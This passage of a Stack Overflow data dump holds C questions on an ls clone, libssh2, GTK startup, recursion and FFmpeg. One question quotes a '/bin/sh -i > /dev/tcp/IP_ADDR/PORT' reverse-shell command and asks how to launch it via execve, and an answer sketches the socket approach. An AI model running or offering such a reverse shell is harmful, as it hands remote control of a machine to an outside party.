&amp;&amp; ft_strcmp(check-&gt;next-&gt;name, new-&gt;name) &lt; 0)\n        check = check-&gt;next;\n    new-&gt;next = check-&gt;next;\n    check-&gt;next = new;\n    char pathname[strlen(dirname) + strlen(name) + 2];\n    sprintf(pathname, \"%s/%s\", dirname, name);\n    if (stat(pathname, &amp;new-&gt;stat) &lt; 0)\n        err_sysrem(\"Failed to stat '%s': \", pathname);\n    return(stock);\n}\n\nstatic t_ls *ft_store(char *foldername)\n{\n    t_ls    *stock = NULL;\n    DIR *dir;\n    struct dirent *dent;\n    dir = opendir(foldername);\n\n    if (dir != NULL)\n    {\n        while ((dent = readdir(dir)) != NULL)\n        {\n            stock = ft_add_elem(dent-&gt;d_name, foldername, stock);\n        }\n    }\n    return(stock);\n}\n\nint main(int argc, char **argv)\n{\n    err_setarg0(argv[0]);\n    if (argc &lt; 2)\n    {\n        argc = 2;\n        argv = (char *[]){ \".\", 0 };\n    }\n    for (int i = 1; i &lt; argc; i++)\n    {\n        t_ls *list = ft_store(argv[i]);\n        t_ls *node = list;\n        while (node != 0)\n        {\n            printf(\"Name: %s (size %llu)\\n\", node-&gt;name, node-&gt;stat.st_size);\n            node = node-&gt;next;\n        }\n    }\n    return 0;\n}\n</code></pre>\n\n<p>The code uses a couple of compound literals, a feature of C99.  There are other ways to achieve the same effects.</p>\n\n<p>Running the program (<code>rd37</code>) on a directory <code>etc</code> gave:</p>\n\n<pre><code>$ ./rd37 etc\nName: . (size 0)\nName: .. (size 2448)\nName: .gitignore (size 38)\nName: README.md (size 99)\nName: posix-opt-end.gif (size 65)\nName: posix-opt-start.gif (size 69)\nName: soq-head.mk (size 1618)\nName: soq-tail.mk (size 665)\nName: suppressions (size 16139)\nName: suppressions-macos-10.12.5 (size 4998)\n$ ls -l etc\ntotal 88\n-rw-r--r--  1 jleffler  staff     99 Jul  9  2016 README.md\n-rw-r--r--@ 1 jleffler  staff     65 Nov 10  2016 posix-opt-end.gif\n-rw-r--r--@ 1 jleffler  staff     69 Nov 10  2016 posix-opt-start.gif\n-rw-r--r--  1 jleffler  staff   1618 Jun 16 23:38 soq-head.mk\n-rw-r--r--  1 jleffler  staff    665 Aug 16  2016 soq-tail.mk\n-rw-r--r--  1 jleffler  staff  16139 Aug 20  2016 suppressions\n-rw-r--r--  1 jleffler  staff   4998 May 21 15:40 suppressions-macos-10.12.5\n$\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 8185086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/67159d6a04157a0a8f572a8a4e27d378?s=128&d=identicon&r=PG&f=1", "display_name": "Lazare Rossillon", "link": "https://stackoverflow.com/users/8185086/lazare-rossillon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1499289638, "creation_date": 1499209496, "last_edit_date": 1499289638, "question_id": 44914979, "link": "https://stackoverflow.com/questions/44914979/value-of-stat-structure-contained-structure-lost", "title": "Value of stat structure contained structure lost", "body": "<p>I'm trying to code the ls function from ground up. In order to do so, I created a linked list of structures containing the information of each file / structure.</p>\n\n<p>Here is the structure : </p>\n\n<pre><code>typedef struct      s_ls\n{\n    char            *name;\n    struct          stat stat;\n    struct          s_ls *next;\n}                       t_ls;\n</code></pre>\n\n<p>I then created a linked list :</p>\n\n<pre><code>t_ls    *ft_store(char *foldername)\n{\n    t_ls    *stock = NULL;\n    DIR *dir;\n    struct dirent *dent;\n    dir = opendir(foldername);\n\n    if(dir != NULL)\n    {\n        while((dent = readdir(dir)) != NULL)\n        {\n            stock = ft_add_elem(dent-&gt;d_name, stock);\n            stat(stock-&gt;name, &amp;(stock-&gt;stat));\n        }\n    }\n    return (stock);\n}\n</code></pre>\n\n<p>The ft_add_elem function mallocs a new structure, adds a new element in alphabtical order, and returns a pointer to the first element in the following manner :</p>\n\n<pre><code>t_ls    *ft_new_elem(char *name)\n{\n    t_ls    *tmp;\n    if (!(tmp = malloc(sizeof(t_ls))))\n        exit(1);\n    tmp-&gt;name = ft_strdup(name);\n    return (tmp);\n}\n\nt_ls    *ft_add_elem(char *name, t_ls *stock)\n{\n    t_ls *new;\n    t_ls *check;\n\n    new = ft_new_elem(name);\n    if (!stock)\n        return (new);\n    check = stock;\n    while (check &amp;&amp; check-&gt;next &amp;&amp; ft_strcmp(check-&gt;next-&gt;name, new-&gt;name) &lt; 0)\n        check = check-&gt;next;\n    new-&gt;next = check-&gt;next;\n    check-&gt;next = new;\n    return (stock);\n}\n</code></pre>\n\n<p>My problem is that when I go through the elements to print them out when the -l option is triggered for instance all stat structures are empty, except for the first one. This is however not the case if I print them from the same function that fills them up (ft_store).</p>\n"}, {"tags": ["c", "libssh2"], "comments": [{"owner": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499206483, "post_id": 44914540, "comment_id": 76805549, "body": "<code>cmd = cmd + &#39;\\n&#39;;</code> C strings do not work this way. Try to print your <code>cmd</code> to console before sending it."}, {"owner": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499206510, "post_id": 44914540, "comment_id": 76805555, "body": "Also, i&#39;m removing <code>C++</code> tag in favour of <code>C</code>."}, {"owner": {"reputation": 191, "user_id": 8222493, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/60bb1c967f8edaf50b289e18b7263e27?s=128&d=identicon&r=PG", "display_name": "Samega 7Cattac", "link": "https://stackoverflow.com/users/8222493/samega-7cattac"}, "reply_to_user": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499209335, "post_id": 44914540, "comment_id": 76806212, "body": "@iehrlich Ok, That&#39;s for my c++ aplication, but that part is only C, you are right. The <code>cmd = cmd + &#39;\\n&#39;</code> is because my old lib I used, but this one don&#39;t need it."}, {"owner": {"reputation": 191, "user_id": 8222493, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/60bb1c967f8edaf50b289e18b7263e27?s=128&d=identicon&r=PG", "display_name": "Samega 7Cattac", "link": "https://stackoverflow.com/users/8222493/samega-7cattac"}, "reply_to_user": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499209504, "post_id": 44914540, "comment_id": 76806251, "body": "@iehrlich Code fixed!"}, {"owner": {"reputation": 191, "user_id": 8222493, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/60bb1c967f8edaf50b289e18b7263e27?s=128&d=identicon&r=PG", "display_name": "Samega 7Cattac", "link": "https://stackoverflow.com/users/8222493/samega-7cattac"}, "reply_to_user": {"reputation": 3514, "user_id": 2612002, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b5a04.png?s=128&g=1", "display_name": "iehrlich", "link": "https://stackoverflow.com/users/2612002/iehrlich"}, "edited": false, "score": 0, "creation_date": 1499209921, "post_id": 44914540, "comment_id": 76806327, "body": "@iehrlich The command is correct before sending it"}], "answers": [{"tags": [], "owner": {"reputation": 117024, "user_id": 200291, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/399cacf55045372a29f1f844d12ee777?s=128&d=identicon&r=PG", "display_name": "icktoofay", "link": "https://stackoverflow.com/users/200291/icktoofay"}, "is_accepted": true, "score": 0, "last_activity_date": 1499209917, "creation_date": 1499209917, "answer_id": 44915027, "question_id": 44914540, "link": "https://stackoverflow.com/questions/44914540/sending-a-command-using-ssh-with-libssh2-lib/44915027#44915027", "title": "Sending a command using ssh with libssh2 lib", "body": "<p>I believe requesting a shell and requesting a single command's execution are mutually exclusive. If you want to run a command, get its output, and end the channel (not necessarily the session), you should run <code>libssh2_channel_exec</code> and <em>not</em> run <code>libssh2_channel_shell</code>.</p>\n"}], "owner": {"reputation": 191, "user_id": 8222493, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/60bb1c967f8edaf50b289e18b7263e27?s=128&d=identicon&r=PG", "display_name": "Samega 7Cattac", "link": "https://stackoverflow.com/users/8222493/samega-7cattac"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1284, "favorite_count": 0, "accepted_answer_id": 44915027, "answer_count": 1, "score": 0, "last_activity_date": 1499209917, "creation_date": 1499206081, "last_edit_date": 1499209552, "question_id": 44914540, "link": "https://stackoverflow.com/questions/44914540/sending-a-command-using-ssh-with-libssh2-lib", "title": "Sending a command using ssh with libssh2 lib", "body": "<p>I try to use libssh2 to send a command over ssh, but cannot receive the expected response.</p>\n\n<p>It connects well wwith my raspberry pi.</p>\n\n<p>function to send a command:</p>\n\n<pre><code>char * s7c_hardware::sendCmd(char * cmd, bool out)\n{\n        if (!(channel = libssh2_channel_open_session(session))) return \"-1\";\n        libssh2_channel_setenv(channel, \"FOO\", \"bar\");\n        if (libssh2_channel_request_pty(channel, \"vanilla\")) return \"-2\";\n        if (libssh2_channel_shell(channel)) return \"-3\";\n        int rc;\n        while ((rc = libssh2_channel_exec(channel, cmd)) ==\n            LIBSSH2_ERROR_EAGAIN)\n        {\n            waitsocket(sock, session);\n        }\n        char * output = \"\";\n        if (out)\n        {\n            do\n            {\n                char buffer[99999];\n                rc = libssh2_channel_read(channel, buffer, sizeof(buffer));\n                if (rc &gt; 0)\n                {\n                    fprintf(stderr, \"We read:\\n\");\n                    for (int i = 0; i &lt; rc; ++i)\n                        fputc(buffer[i], stderr);\n                    fprintf(stderr, \"\\n\");\n                }\n                else {\n                    if (rc != LIBSSH2_ERROR_EAGAIN)\n                        fprintf(stderr, \"libssh2_channel_read returned %d\\n\", rc);\n                }\n            } while (rc &gt; 0);\n        }\n        libssh2_channel_free(channel);\n        channel = NULL;\n        return output;\n}\n</code></pre>\n\n<p>Where <code>cmd</code> is the command and <code>out</code> is if wants output or not.</p>\n\n<p>And if I try to send \"uptime\" and receive the up time, I receive this instead:</p>\n\n<pre><code>We read:\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sat Jul  1 10:27:51 2017 from desktop-ca160hm.local\n\nWe read:\npi@rasp:~$\n</code></pre>\n"}, {"tags": ["c", "execve", "reverse-shell"], "comments": [{"owner": {"reputation": 1, "user_id": 9633122, "user_type": "unregistered", "profile_image": "https://www.gravatar.com/avatar/81cd421e155d751579fb9badd419a57c?s=128&d=identicon&r=PG", "display_name": "user9633122", "link": "https://stackoverflow.com/users/9633122/user9633122"}, "edited": false, "score": 0, "creation_date": 1523486323, "post_id": 44914538, "comment_id": 86588547, "body": "The second argument of execve still has <code>argv[0], &quot;&#47;bin&#47;sh&quot;</code>, removing that might fix it."}], "answers": [{"comments": [{"owner": {"reputation": 14789, "user_id": 682869, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/vJH1M.jpg?s=128&g=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/682869/jake"}, "edited": false, "score": 0, "creation_date": 1499207193, "post_id": 44914663, "comment_id": 76805737, "body": "I did try with <code>&#47;bin&#47;bash</code>, but that didn&#39;t work either."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 14789, "user_id": 682869, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/vJH1M.jpg?s=128&g=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/682869/jake"}, "edited": false, "score": 0, "creation_date": 1499207468, "post_id": 44914663, "comment_id": 76805789, "body": "@Jake bash or ksh has to be the shell that interprets the path (not the program that gets directed to it). In your case, it&#39;s your program that would open the path but the path doesn&#39;t exist in the system. What bash/kash do when they encounter such a path is they treat it as a magical string that tells them to do the standard BSD socket dance around IP_ADDR and PORT. Your program should skip the magical path stuff altogether and simply do the socket dance."}], "tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": false, "score": 1, "last_activity_date": 1499207741, "last_edit_date": 1499207741, "creation_date": 1499206915, "answer_id": 44914663, "question_id": 44914538, "link": "https://stackoverflow.com/questions/44914538/execute-reverse-shell-using-execve/44914663#44914663", "title": "Execute reverse shell using execve()", "body": "<p>The <code>/dev/tcp/*/*</code> files don't exist. They're an abstraction that only exists in some shell (bash, ksh). You'll need to do regular socket programming in your C program (<code>socket</code>, <code>bind</code>, <code>listen</code>, <code>accept</code> and then <code>dup2</code> the socket on the standard IO descriptors of the shell you spawn). </p>\n\n<p>You should also fix the overflow in the array.\nAn initialization such as  <code>char *args[] = { \"/bin/sh\", \"-i\", 0 };</code> should be less error prone.</p>\n"}], "owner": {"reputation": 14789, "user_id": 682869, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/vJH1M.jpg?s=128&g=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/682869/jake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 808, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1523487881, "creation_date": 1499206071, "question_id": 44914538, "link": "https://stackoverflow.com/questions/44914538/execute-reverse-shell-using-execve", "title": "Execute reverse shell using execve()", "body": "<p>I need to run a reverse shell using <code>execve</code>. I know how to run it from command line as follows:</p>\n\n<pre><code>$ /bin/sh -i &gt; /dev/tcp/IP_ADDR/PORT 0&lt;&amp;1 2&gt;&amp;1\n</code></pre>\n\n<p>I can run a simple version of <code>/bin/sh</code> call as follows:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n\n   char *args[2];\n   args[0] = \"/bin/sh\";\n   args[1] = \"-i\";\n   args[2] = NULL;\n\n   execve(args[0], args, NULL);\n}\n</code></pre>\n\n<p>I am not able to figure out how to run the rest of the command. I tried assigning the remaining string <code>&gt; /dev/tcp/IP_ADDR/PORT 0&lt;&amp;1 2&gt;&amp;1</code> as individual elements in the <code>args</code> array. When I run that it reports that <code>Can't open &gt;</code>.</p>\n\n<p>Is the reverse shell command I mentioned executable via <code>execve()</code> ? If so, what would be the right way to do it ? Thanks.</p>\n"}, {"tags": ["c", "gtk", "64-bit"], "comments": [{"owner": {"reputation": 2233, "user_id": 2669128, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/430a24425fb593f00def23e45c454c39?s=128&d=identicon&r=PG", "display_name": "thurizas", "link": "https://stackoverflow.com/users/2669128/thurizas"}, "edited": false, "score": 0, "creation_date": 1499203223, "post_id": 44914018, "comment_id": 76804721, "body": "seems closely related (or a duplicate of) <a href=\"https://stackoverflow.com/questions/10492037/the-application-was-unable-to-start-correctly-0xc000007b\" title=\"the application was unable to start correctly 0xc000007b\">stackoverflow.com/questions/10492037/&hellip;</a>"}, {"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "reply_to_user": {"reputation": 2233, "user_id": 2669128, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/430a24425fb593f00def23e45c454c39?s=128&d=identicon&r=PG", "display_name": "thurizas", "link": "https://stackoverflow.com/users/2669128/thurizas"}, "edited": false, "score": 0, "creation_date": 1499203525, "post_id": 44914018, "comment_id": 76804815, "body": "It&#39;s loading 32 bit DLL&#39;s, but I&#39;m using 64 bit cmake and 64 bit gtk library and I have a 64 bit system, so why It&#39;s using the 32 bit windows dll&#39;s"}], "answers": [{"tags": [], "owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "is_accepted": false, "score": 0, "last_activity_date": 1499204900, "creation_date": 1499204900, "answer_id": 44914363, "question_id": 44914018, "link": "https://stackoverflow.com/questions/44914018/application-wont-start-0xc000007b-with-gtk-and-c/44914363#44914363", "title": "Application won&#39;t start (0xc000007b) with GTK+ and C", "body": "<p>Ok, I fixed my own bug ^^</p>\n\n<p>I set an GTK_BASEPATH in my system variables and the PATH variable to an old version of GTK (32 bit) and It used these files as library.</p>\n"}], "owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 583, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1499204900, "creation_date": 1499202536, "last_edit_date": 1499202836, "question_id": 44914018, "link": "https://stackoverflow.com/questions/44914018/application-wont-start-0xc000007b-with-gtk-and-c", "title": "Application won&#39;t start (0xc000007b) with GTK+ and C", "body": "<p>I have written an really basic test application in C with GTK+ 3, but when I want to start this application I'm getting the following error:</p>\n\n<blockquote>\n  <p>The application was unable to start correctly (0xc000007b)</p>\n</blockquote>\n\n<p>But Im getting this only with GTK+ 3.</p>\n\n<p>My Code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;gtk/gtk.h&gt;\n\nstatic void activate(GtkApplication *app, gpointer user_data) {\n    GtkWidget *window;\n\n    window = gtk_application_window_new(app);\n\n    gtk_window_set_title(GTK_WINDOW (window), \"Tutorial\");\n    gtk_window_set_default_size(GTK_WINDOW(window), 200, 200);\n    gtk_widget_show_all(window);\n\n}\n\nint main(int argc, char **argv) {\n    printf(\"Hello, World!\\n\");\n\n    //printf(\"Ein akustisches Signal mit : (\\\\a)\\a\");\n    printf(\"\\nEin Backspace mit : (\\\\b) | \\bx\\n\");\n    printf(\"Ein Zeilenvorschub mit : (\\\\t) |\\tx\");\n    printf(\"\\n\\tC\\n\\ti\\n\\ts\\n\\tt\\n\\ttoll\\n\");\n    printf(\"\\t   u\\n\\t   n\\n\\t   d\\n\");\n    printf(\"\\t   macht Spa\u00df\\n\");\n\n    //Kommentar 1\n    /* Kommentar 2 */\n    /*\n     * Mehrzeiliges Kommentar\n     */\n\n    GtkApplication *app;\n    int status;\n\n    app = gtk_application_new(\"org.gtk.example\", G_APPLICATION_FLAGS_NONE);\n\n    g_signal_connect(app, \"activate\", G_CALLBACK(activate), NULL);\n\n    status = g_application_run(G_APPLICATION(app), argc, argv);\n\n    g_object_unref(app);\n\n    return status;\n}\n</code></pre>\n\n<p>CMakeLists.txt:</p>\n\n<pre><code>cmake_minimum_required(VERSION 3.7)\nproject(tutorial)\n\nset(CMAKE_C_STANDARD 99)\n\nset(SOURCE_FILES main.c)\n\nset(PKG_CONFIG_EXECUTABLE \"C:/msys64/mingw64/bin/pkg-config.exe\")\n\nFIND_PACKAGE(PkgConfig REQUIRED)\nPKG_CHECK_MODULES(GTK3 REQUIRED gtk+-3.0)\n\nINCLUDE_DIRECTORIES(${GTK3_INCLUDE_DIRS})\nLINK_DIRECTORIES(${GTK3_LIBRARY_DIRS})\n\nadd_executable(tutorial ${SOURCE_FILES})\n\nADD_DEFINITIONS(${GTK3_CFLAGS_OTHER})\n\nTARGET_LINK_LIBRARIES(tutorial ${GTK3_LIBRARIES})\n</code></pre>\n\n<p>Im using Clion 2017.1.3, mingw-w64 5.0 and cmake 3.7.2 (x64) with gdb 7.11.1 (x64)</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1499201794, "post_id": 44913844, "comment_id": 76804229, "body": "Compiler say <i>warning C4033: &#39;coFactors&#39; must return a value</i>. That would apply to each of its three conditional code blocks."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499201798, "post_id": 44913844, "comment_id": 76804232, "body": "Working and crashing in the same time... What? Sounds like a quantum computer."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499201922, "post_id": 44913844, "comment_id": 76804272, "body": "1) <code>int coFactors(</code> --&gt; <code>void coFactors(</code>, Show your input."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1499202087, "post_id": 44913844, "comment_id": 76804342, "body": "Are you <i>quite sure</i> that the recursion will always hit a base case? I don&#39;t think it will."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 1, "creation_date": 1499202283, "post_id": 44913844, "comment_id": 76804408, "body": "try <code>if(number==divisor-1)</code> --&gt; <code>if(number&lt;divisor)</code>"}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499202764, "post_id": 44913844, "comment_id": 76804553, "body": "E.g If you enter 27 in your code, recursion will not finish, So It&#39;s causing stack overflow."}, {"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "reply_to_user": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 0, "creation_date": 1499202961, "post_id": 44913844, "comment_id": 76804638, "body": "@BLUEPIXY Why 27? 3 is plenty."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1499203029, "post_id": 44913844, "comment_id": 76804660, "body": "@EOF Anything is fine. ;-)"}], "answers": [{"comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1499203121, "post_id": 44913991, "comment_id": 76804691, "body": "Your original answer would <b>not</b> have avoided infinite descent for such unusual values as <code>1</code>."}, {"owner": {"reputation": 18493, "user_id": 8176478, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bfdd0a05bddc5a0bcaf042597babdef?s=128&d=identicon&r=PG&f=1", "display_name": "MKR", "link": "https://stackoverflow.com/users/8176478/mkr"}, "reply_to_user": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1499203275, "post_id": 44913991, "comment_id": 76804742, "body": "True. Or the cases where value was less than divisor."}], "tags": [], "owner": {"reputation": 18493, "user_id": 8176478, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bfdd0a05bddc5a0bcaf042597babdef?s=128&d=identicon&r=PG&f=1", "display_name": "MKR", "link": "https://stackoverflow.com/users/8176478/mkr"}, "is_accepted": false, "score": 0, "last_activity_date": 1499203055, "last_edit_date": 1499203055, "creation_date": 1499202300, "answer_id": 44913991, "question_id": 44913844, "link": "https://stackoverflow.com/questions/44913844/c-program-working-and-stop-running-at-the-same-time/44913991#44913991", "title": "C program working and stop running at the same time?", "body": "<p>seems below condition is wrong:</p>\n\n<pre><code>else if(number==divisor-1)\n</code></pre>\n\n<p>it should be:</p>\n\n<pre><code>else if(number &lt; (divisor))\n</code></pre>\n\n<p>My earlier post would have avoided crashed but to get correct Co factor condition should have been like edited.</p>\n\n<p>BLUEPIXY has suggested correctly. </p>\n"}], "owner": {"reputation": 51, "user_id": 7178807, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-AsSCWCh5T-Y/AAAAAAAAAAI/AAAAAAAAADw/5zcBl_4Md6w/photo.jpg?sz=128", "display_name": "Kartikey ", "link": "https://stackoverflow.com/users/7178807/kartikey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1499203055, "creation_date": 1499201463, "last_edit_date": 1592644375, "question_id": 44913844, "link": "https://stackoverflow.com/questions/44913844/c-program-working-and-stop-running-at-the-same-time", "title": "C program working and stop running at the same time?", "body": "<h1>How can I run this program without any crash #C #CoFactors</h1>\n<p>This program is about finding cofactors of a number it is working but at the same time this program crashes after showing the output. Please take a look.</p>\n<p>Here is the program.</p>\n<pre><code>int coFactors(int number,int divisor)\n{\nif(number%divisor==0)\n{\n    printf(&quot;%d &quot;,divisor);\n    number /= divisor;\n    coFactors(number,divisor);\n}\nelse if(number==divisor-1)\n{\n    return;\n}\nelse\n{\n    coFactors(number,++divisor);\n}    \n             }                                 \n           \nint main()            \n{                \nint num;                  \nprintf(&quot;Enter number:&quot;);               \nscanf(&quot;%d&quot;,&amp;num);              \ncoFactors(num,2);\n\nreturn 0;         \n}                \n</code></pre>\n"}, {"tags": ["c", "video", "memory", "ffmpeg", "racket"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499199879, "post_id": 44913445, "comment_id": 76803543, "body": "If the code is in racket, why do you post incomplete snippets of C code?"}, {"owner": {"reputation": 18895, "user_id": 288439, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81496c48185e5ddd59654ccae341c166?s=128&d=identicon&r=PG", "display_name": "Leif Andersen", "link": "https://stackoverflow.com/users/288439/leif-andersen"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1499200916, "post_id": 44913445, "comment_id": 76803900, "body": "Because the FFmpeg libraries are written in C, and I&#39;m using a C FFI to bind to them. As well as using the C style memory management."}, {"owner": {"reputation": 40834, "user_id": 297323, "user_type": "registered", "accept_rate": 67, "profile_image": 